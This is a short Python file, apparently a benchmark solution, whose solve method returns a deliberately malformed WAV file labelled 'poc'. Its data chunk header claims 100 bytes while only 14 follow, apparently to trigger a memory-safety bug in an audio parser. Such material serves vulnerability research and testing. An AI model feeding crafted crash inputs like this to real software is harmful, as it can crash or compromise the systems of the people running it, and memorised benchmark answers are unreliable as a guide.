class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = (
            b'RIFF\x32\x00\x00\x00'
            b'WAVE'
            b'fmt \x10\x00\x00\x00\x01\x00\x01\x00\x44\xac\x00\x00\x88\x58\x01\x00\x02\x00\x10\x00'
            b'data\x64\x00\x00\x00'
            + b'\x00' * 14
        )
        return poc
